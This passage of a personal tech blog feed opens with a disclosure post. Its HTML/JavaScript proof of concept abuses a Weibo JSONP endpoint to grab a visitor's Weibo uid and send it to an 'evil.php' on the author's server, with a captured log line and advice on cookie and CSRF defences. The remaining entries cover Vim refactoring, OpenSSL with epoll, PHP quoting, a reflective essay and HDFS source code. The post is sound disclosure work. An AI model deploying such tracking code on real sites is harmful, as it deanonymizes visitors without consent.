<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!doctype html&gt;</span>
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;head&gt;</span>
</span><span class='line'><span class="nt">&lt;/head&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'><span class="nt">&lt;p&gt;</span> Hello World <span class="nt">&lt;/p&gt;</span>
</span><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="kd">function</span> <span class="nx">STK_1</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="c1">// wow, get the uid</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">uid</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">uid</span><span class="p">;</span>
</span><span class='line'><span class="c1">// save the uid to the server</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span class='line'><span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://www.jjyao.me/evil.php?uid=&quot;</span> <span class="o">+</span> <span class="nx">uid</span><span class="p">,</span> <span class="kc">true</span> <span class="p">);</span>
</span><span class='line'><span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;http://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&amp;callback=STK_1&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</span><span class='line'><span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>每当用户访问这个网页的时候就在后面发一个aj_relationship.php的请求，然后指定一个已经定义好的callback，这样等请求结果返回后指定的callback就会被执行，于是就可以获取到当前登陆用户的微博uid了，最后要做的就是将这个uid传回给服务器保存起来。而这个可以通过服务器的log来实现，比如Nginx有access log，会将每个访问的url记录在日志中，结果如下：</p>

<pre><code>219.219.125.217 - - [25/Jan/2013:14:38:39 +0000] "GET /evil.php?uid=2369955640 HTTP/1.1" 200 31 "http://www.jjyao.me/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.56 Safari/537.17"
</code></pre>

<p>于是在服务器端就可以统计有哪些微博用户访问了这个网站，他们都是谁。</p>

<p>正如上面所说的那样，只要添加一些简单的代码，一个网站就可以知道哪些用户访问了，因为知道微博账号实际上很大程度等于知道了用户的真实身份。也就是说通过微博的这么一个漏洞，我们的隐私被泄露了，我们实际上没有匿名访问一个网站，而都是实名在访问，想想还是蛮可怕的。</p>

<h2>解决</h2>

<p>解决这个问题的手段无非就是两大类：一类是用户在客户端解决，一类是新浪在服务端解决。</p>

<h3>客户端解决</h3>

<p>在客户端解决的话我们要做的就是在向widget.weibo.com发送请求时，不让浏览器发送新浪微博的Session Cookie和Third-Party Cookie，因为就是这Cookie才使得新浪知道当前用户是谁的。相比于禁止发送Session Cookie而言，禁止Third-Party Cookie会更容易。要想禁止Third-Party Cookie可以禁止储存它或者储存了但是禁止发送。要想不存储Third-Party Cookie可以选择不记住密码，在Chrome的Incognito Window中打开，在浏览器中设置不保存Cookie这几种方法。而要想禁止发送Third-Party Cookie可以选择IE或者Safari浏览器，因为这两个浏览器出于安全的考虑，默认禁止了浏览器在<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;link&gt;</code>等标签中发送Third-Party Cookie，所以如果用IE或者Safari，那么网站可能不知道当前用户是谁了。解决了Third-Party Cookie并不表示问题解决了，因为还有Session Cookie。也就说如果在当前Session中访问过新浪微博，那么微博就会设置Session Cookie，在同一个Session再去访问安插有恶意代码的网站，还是能使网站知道当前用户的微博uid，因此在访问完新浪后要退出浏览器或者执行其他能让浏览器清除Session Cookie的操作，然后再去访问其他网站，这样就能解决Session Cookie的问题了。只有同时解决了Session Cookie和Third-Party Cookie，上述的隐私泄露问题才能得到解决。</p>

<h3>服务器端解决</h3>

<p>服务器端解决最简单的方法就是不返回uid信息，或者是采取措施限制CSRF。对于后一种做法就引申出一个大的Topic了，有兴趣的可以看看<a href="http://book.douban.com/subject/10546925/">《白帽子讲Web安全》</a>中有关于如何防止CSRF的章节。另外，这确实是本好书:)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Refactor with Vim]]></title>
    <link href="http://JiajunYao.github.com/blog/2012/12/09/refactor-with-vim/"/>
    <updated>2012-12-09T23:28:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2012/12/09/refactor-with-vim</id>
    <content type="html"><![CDATA[<p>使用IDE的一个大好处就是可以方便的进行重构，想想Eclipse那彪悍的重构功能吧。可是对于我们这种喜欢用Vim的人来说，要如何来进行代码重构呢？接下来我就介绍一些Tips，来让Vim也能干重构的事。</p>

<!-- more -->


<h2>变量名、函数名、类名变更</h2>

<p>如果这个变更只在一个文件中进行那就很方便了，可以使用Vim的替换命令：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:%s/old/new/g</span></code></pre></td></tr></table></div></figure>


<p>可万一现在有很多文件呢，我们需要将每个出现的地方都进行变更，这时我们可以这样做：
首先先写一个shell的函数，然后放到bashrc或者zshrc中去</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function vr() {
</span><span class='line'>    vim -c "bufdo %s/$1/$2/gc | update" $(ack-grep -i -l "$1") # 这里也可以使用grep命令，只是我觉得ack-grep要更好用一些
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>这样当想要替换的时候，只要在shell中执行以下命令就可以了：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vr old new</span></code></pre></td></tr></table></div></figure>


<p>这样当前目录及子目录下所有文件中的<em>old</em>都会替换成<em>new</em>，同时每次替换都会要求确认，这样就防止了可能出现的错误</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OpenSSL Read Ahead &amp; Epoll]]></title>
    <link href="http://JiajunYao.github.com/blog/2012/08/28/openssl-read-ahead-and-epoll/"/>
    <updated>2012-08-28T12:06:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2012/08/28/openssl-read-ahead-and-epoll</id>
    <content type="html"><![CDATA[<p>Use epoll with a ssl socket and ignore the OpenSSL read ahead feature</p>

<!-- more -->


<h2>Scenario</h2>

<p>I write a python program to implement IMAP client that uses the IDLE command. So I have a ssl client socket and I use epoll level triggered mode to implement non-blocking socket.</p>

<p>However, epoll doesn&#8217;t work correctly. For example, in the IDLE mode, IMAP server sends two lines at a time. My client <code>select.epoll()</code> function returns because the ssl socket is readable. Then I read one line and call <code>select.epoll()</code> again. Because I use epoll level triggered mode so the <code>select.epoll()</code> should return immediately because the socket still has one line that is ready for read. But in fact, when I call <code>select.epoll()</code> again, it blocks and doesn&#8217;t return.</p>

<h2>Bug</h2>

<p>OpenSSL has read ahead feature, which means that it may read more data to its internal buffer. So when I read one line, it may indead read two lines, decrypt and store them to the internal buffer. That is why <code>select.epoll()</code> blocks because all the data in the underlying socket is read to the OpenSSL internal buffer and the socket is unreadable.</p>

<h2>Solution</h2>

<p>Use <code>pending()</code> method to see whether ssl has decrypted bytes that are available for read.</p>

<h2>Reference</h2>

<p>For more information about OpenSSL read ahead feature, you can refer to &#8220;SSL and TLS Designing and Building Secure Systems&#8221; section 8.9.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PHP single quoted]]></title>
    <link href="http://JiajunYao.github.com/blog/2012/08/07/php-single-quoted/"/>
    <updated>2012-08-07T21:38:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2012/08/07/php-single-quoted</id>
    <content type="html"><![CDATA[<p>Use PHP single quoted when I should use double quoted</p>

<!-- more -->


<h2>Scenario</h2>

<p>I write a Python Twisted line receiver server, so the server reads one line at a time. Then I write a PHP client to send lines to server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">socket_write($socket, &#39;it is one line\r\n&#39;, strlen);</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, my server can&#8217;t receive a whole line and blocked to wait for <strong>\r\n</strong></p>

<h2>Bug</h2>

<p>In a single quoted string, escape sequences you might be used to, such as \r or \n, will be output literally as specified rahter than having any special meaning. So my server receive \r\n literally and doesn&#8217;t think that it is a new line character.</p>

<h2>Solution</h2>

<p>Change single quotes to double quotes</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="x">socket_write($socket, &quot;it is one line\r\n&quot;, strlen);</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[阅读·实践·思考]]></title>
    <link href="http://JiajunYao.github.com/blog/2012/07/21/read-practice-think/"/>
    <updated>2012-07-21T22:29:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2012/07/21/read-practice-think</id>
    <content type="html"><![CDATA[<p>阅读，实践和思考这三个独立的词在我眼中有着千丝万缕的关系。这三者对个人的成长和发展起到了重要的作用，我们需要阅读，需要实践也需要思考。在我眼中阅读为我们提供了实践不到或者思考不到的知识，实践则让我们获得最真切最深刻的属于自己的知识，而思考则是获得知识的一个很重要的前提。下面我想谈谈我对这三者的理解和思考，也欢迎大家提出自己的观点。而我之所以选择把它写成文章贴出来是希望通过文字可以使我思考得更深、更清晰。</p>

<!-- more -->


<h2>实践</h2>

<p>实践能让我们获得第一手的真正属于自己的知识。当我们在与外部接触做很多事情的时候，我们就能悟出或者体会到一些道理。在我看来实践不仅是检验真理的唯一标准，实践也是产生真理的重要途径。</p>

<p>以前我经常在想为什么那些名人，伟人能有这么多的感悟，能有自己的想法，能提出自己的观点，能说出各种”玄乎“的话。为什么我就想不到这些呢？渐渐地，我发现原来这一切没有想象中的这么神秘，我们每个人都能”悟“到点东西，可能只是没有那些人那么深远罢了。比如人们常说兴趣是最好的老师，我们要按照兴趣做事。开始我不能理解，直到到了大学，发现写喜欢的项目总是那么莫名地兴奋，被逼着写那些自己不喜欢的东西时总是那么痛苦，总是一再拖延。我想我知道了什么是兴趣，我也能懂了那句话的含义。有些话我们现在不能理解，可能只是我们经历的太少，没有经历过“悟”出那些话的人所经历过的事情。但随着我们实践的越多，接触的越多，我们能感悟到的东西也会越多，我们的思想也会更加丰富。</p>

<p>对于我们大学生来说，我们要多参加一些活动，多多开拓我们的视野，多和人接触接触，多留心周围的一切。当我们在做各种事情的时候，我们的人生就越来越丰富，我们能从中提取的知识也就会越多。我很难想象一个窝在寝室打了4年Dota的人，能“悟”出些什么东西，除了“游戏会使他找不到好工作”之外。</p>

<h2>阅读</h2>

<p>虽说实践能让我们自己“悟”到知识和道理，但一个人人生有限，思考的深度有限，因此总有很多自己“悟”不到的知识和道理，这时候就是阅读派上用场的时候了。每一本书中包含了作者的知识，这些是作者自己从实践中提炼出来的，浓缩后的知识。</p>

<p>我们可能没有机会踏出国门，去感受西方的民主是什么，因此可能自己悟不出对民主的一系列看法。这时候有效的途径就是阅读那些有留洋经历并深入思考的人写的书，比如刘瑜的《民主的细节》。我们可能无法从历史中看出“中国以道德代替法律”并由此引发的一系列问题，这时候我们可以看黄仁宇的《万历十五年》，这是他对中国的思考。我们可能没有能力自己去总结设计模式，这时候我们可以看GoF的《Design Pattern》，这是他们多年软件实践经验的总结。</p>

<p>在我心中阅读的最佳情况就是将阅读和自己的实践经历结合起来，这时候的阅读最有效果，印象也最深。当我们在阅读的时候，我们要联想到自己的实践经历，想想自己的实践经历可以用来支持还是反对作者的观点。这样对于支持的观点我们可以感悟的更深，毕竟有了自己的亲身经历作支撑。而对于反对的观点，我们可以避免盲目地相信，并对作者的观点有更全面的认识。但并不是作者要表达的观点我们都可以用自己的经历来进行验证，这时就需要作者在文章中详细的给出他自己“悟”到这个观点的经历，这样能让读者”身临其境“，就好像自己亲身经历了一番，也就是说作者需要提供丰富的例子来支撑他的观点。</p>

<p>对于我们大学生来说，人生阅历还是太少，因此有大量的知识是需要从阅读中获得的。我们在大学期间要多多阅读各类书籍，拓展我们的知识面。当然只是不停地阅读是没有用的，还有一个重要且必须的环节，那就是思考。</p>

<h2>思考</h2>

<p>有了实践和阅读，我们还需要的就是思考。如果没有思考，那我们获得的知识就是脆弱的，或者那根本就不是知识。如果我们只是不停地去实践，而不会在事后停下来思考思考，那我们就无法从实践中提炼出知识。如果我们只是不停地阅读，而对作者的观点没有自己的思考，那么这些知识还只是属于作者，而不是我们的。</p>

<p>实践和思考缺一不可，实践为思考提供了原材料，思考是升华实践的手段。当我们做完一件事后，我们要静下来思考一下，看看我们从中能得到什么。可能这次的经历让你对曾经在阅读中发现的一个观点产生了认同或否定，也有可能你自己就产生了你的观点。因此我们的脚步不能走的太快，我们需要慢下来，想想。</p>

<p>当我们在阅读的时候，我们对作者的观点要问一句“是这样吗”，然后找找看支持作者观点的理由，或者反对作者观点的理由。如果我们只是不停的读书，对作者的观点全盘吸收而不加任何自己的思考，这样的阅读是有欠缺的。在我认为读书可以很轻松也可以很累。轻松的做法是阅读时找出作者的观点，然后默念几遍或者摘抄下来，把作者的观点拿来当自己的，在这过程中没有自己的思维活动。累的做法是让自己的思想和作者的思想发生碰撞，真正的从内心赞同或者反对作者的观点。轻松的做法看似简单实际上只是盲目的相信，是思维的懒惰。而累的方法是真正有效阅读的方法。</p>

<p>思考是如此的重要，以至于不管是实践还是阅读都离不开它。作为大学生，我们需要这种能力。但现实的情况是经过了“幼稚园小学”、“幼稚园初中”、“幼稚园高中”和“幼稚园大学”的培养，我们缺乏独立自主思考的能力，我们不会思考。因此当务之急是要培养我们的独立思考能力，然后才能进行有效的实践和阅读。</p>

<p>以上就是我对阅读、实践和思考的理解。三者相辅相成共同丰富着我们的人生，我们的生活离不开其中任何一个。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HDFS Source Code Analysis]]></title>
    <link href="http://JiajunYao.github.com/blog/2012/06/18/hdfs-source-code-analysis/"/>
    <updated>2012-06-18T19:28:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2012/06/18/hdfs-source-code-analysis</id>
    <content type="html"><![CDATA[<ol>
<li><a href="#instantiate_FileSystem">创建FileSystem</a></li>
<li><a href="#hdfs_client_send_request">HDFS客户端向服务器发送rpc请求</a></li>
<li><a href="#hdfs_server_handle_client_request">HDFS服务器对客户端rpc请求的处理</a></li>
<li><a href="#hdfs_datanode_storage_related_class">DataNode中和数据相关的类</a></li>
<li><a href="#hdfs_datanode_start">DataNode的启动</a></li>
<li><a href="#reference">参考资料</a></li>
</ol>


<!-- more -->


<h2><a id="instantiate_FileSystem"></a>创建FileSystem</h2>

<p>FileSystem在Hadoop中只是一个抽象类，它屏蔽了各种底层文件系统的实现，这有点Linux VFS的味道。在Hadoop中各个文件系统的实现都是继承了FileSystem这个抽象类的，因此用户只需要通过FileSystem的接口来操作底层的文件系统就可以了。Hadoop中具体的文件系统实现有很多，如DistributedFileSystem和LocalFileSystem。如何告知Hadoop要使用哪一个具体的文件系统实现是这节要讨论的。</p>

<p>在这里我们可以通过在Hadoop的配置文件里指定fs.default.name来实现，当然也可以在程序中显式指定。假设我们指定fs.default.name的值为hdfs://localhost:9000，其中的<em>hdfs</em>就是告诉Hadoop要使用DistributedFileSystem。Hadoop会从fs.default.name中抽出hdfs，然后去配置文件里找fs.<em>hdfs</em>.impl，这个可以在core-default.xml中找到，值为org.apache.hadoop.hdfs.DistributedFileSystem，可以看出Hadoop已经成功找到具体要创建的文件系统实现是什么了，接下来Hadoop通过反射就能由类名创建出类实例来，然后返回给用户使用。类似的如果我们指定fs.default.name的值为file:///，那么Hadoop就会去配置文件里找fs.<em>file</em>.impl，这个的值就是org.apache.hadoop.fs.LocalFileSystem。当然我们还能给fs.default.name指定很多其他的值来告诉Hadoop要使用的底层文件系统实现是什么。在这里还要说明的是fs.default.name的默认值就是file:///。接下来给出一些关键代码：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/** FileSystem.java **/</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* 创建FileSystem的工厂方法 */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">FileSystem</span> <span class="nf">get</span><span class="o">(</span><span class="n">Configuration</span> <span class="n">conf</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nf">get</span><span class="o">(</span><span class="n">getDefaultUri</span><span class="o">(</span><span class="n">conf</span><span class="o">),</span> <span class="n">conf</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* 获取配置文件中fs.default.name的值，并转化成一个URI对象 */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">URI</span> <span class="nf">getDefaultUri</span><span class="o">(</span><span class="n">Configuration</span> <span class="n">conf</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">URI</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">fixName</span><span class="o">(</span><span class="n">conf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">FS_DEFAULT_NAME_KEY</span><span class="o">,</span> <span class="s">&quot;file:///&quot;</span><span class="o">)));</span> <span class="c1">// FS_DEFAULT_NAME_KEY的值就是fs.default.name</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">FileSystem</span> <span class="nf">get</span><span class="o">(</span><span class="n">URI</span> <span class="n">uri</span><span class="o">,</span> <span class="n">Configuration</span> <span class="n">conf</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">{</span>
</span><span class='line'>    <span class="n">Key</span> <span class="n">key</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Key</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="n">FileSystem</span> <span class="n">fs</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>    <span class="kd">synchronized</span> <span class="o">(</span><span class="k">this</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">fs</span> <span class="o">=</span> <span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">fs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">fs</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">fs</span> <span class="o">=</span> <span class="n">createFileSystem</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span> <span class="c1">// 只关注这个函数</span>
</span><span class='line'>    <span class="kd">synchronized</span> <span class="o">(</span><span class="k">this</span><span class="o">)</span> <span class="o">{</span>  <span class="c1">// refetch the lock again</span>
</span><span class='line'>        <span class="n">FileSystem</span> <span class="n">oldfs</span> <span class="o">=</span> <span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">oldfs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// a file system is created while lock is releasing</span>
</span><span class='line'>            <span class="n">fs</span><span class="o">.</span><span class="na">close</span><span class="o">();</span> <span class="c1">// close the new file system</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">oldfs</span><span class="o">;</span>  <span class="c1">// return the old file system</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// now insert the new file system into the map</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">map</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">clientFinalizer</span><span class="o">.</span><span class="na">isAlive</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">addShutdownHook</span><span class="o">(</span><span class="n">clientFinalizer</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="n">fs</span><span class="o">.</span><span class="na">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">;</span>
</span><span class='line'>        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">fs</span><span class="o">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">fs</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="n">FileSystem</span> <span class="nf">createFileSystem</span><span class="o">(</span><span class="n">URI</span> <span class="n">uri</span><span class="o">,</span> <span class="n">Configuration</span> <span class="n">conf</span>
</span><span class='line'>        <span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// 从fs.default.name的值中抽取出scheme部分，也就是开头的那部分。然后从配置文件中找fs.**.impl的值，也就是要实例的类的名字</span>
</span><span class='line'>    <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">conf</span><span class="o">.</span><span class="na">getClass</span><span class="o">(</span><span class="s">&quot;fs.&quot;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot;.impl&quot;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span><span class='line'>    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&quot;Creating filesystem for &quot;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IOException</span><span class="o">(</span><span class="s">&quot;No FileSystem for scheme: &quot;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">());</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="c1">// 反射，根据类名创建类实例</span>
</span><span class='line'>    <span class="n">FileSystem</span> <span class="n">fs</span> <span class="o">=</span> <span class="o">(</span><span class="n">FileSystem</span><span class="o">)</span><span class="n">ReflectionUtils</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="n">fs</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">fs</span><span class="o">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2><a id="hdfs_client_send_request"></a>HDFS客户端向服务器发送rpc请求</h2>

<p>对于HDFS来说我们是通过DistributedFileSystem来进行文件系统的操作的，在这里DistributedFileSystem就是client，而server就跑在NameNode上面。我们通过DistributedFileSystem发出的所有操作都会通过rpc传递到NameNode的server上，然后再执行最后将结果返回。这就是client和server之间的rpc。</p>

<p>这节谈论client如何将用户对DistributedFileSystem的方法调用传递到server端。在这里我们以<code>mkdirs()</code>方法为例，假设用户调用了DistributedFileSystem的<code>mkdirs()</code>方法，代码如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">mkdirs</span><span class="o">(</span><span class="n">Path</span> <span class="n">f</span><span class="o">,</span> <span class="n">FsPermission</span> <span class="n">permission</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">statistics</span><span class="o">.</span><span class="na">incrementWriteOps</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">dfs</span><span class="o">.</span><span class="na">mkdirs</span><span class="o">(</span><span class="n">getPathName</span><span class="o">(</span><span class="n">f</span><span class="o">),</span> <span class="n">permission</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>可以看到DistributedFileSystem将方法调用转交给了实例变量dfs，这个就是DFSClient的实例，这个是rpc的一个关键点，官方文档对这个类的描述是</p>

<blockquote><p>DFSClient can connect to a Hadoop Filesystem and perform basic file tasks. It uses the ClientProtocol to communicate with a NameNode daemon, and connects directly to DataNodes to read/write block data. Hadoop DFS users should obtain an instance of DistributedFileSystem, which uses DFSClient to handle filesystem tasks.</p></blockquote>

<p>可以看出DistributedFileSystem将所有对文件系统的操作都转交给了DFSClient来处理。接下来我们就看看DFSClient是怎么处理的。代码如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
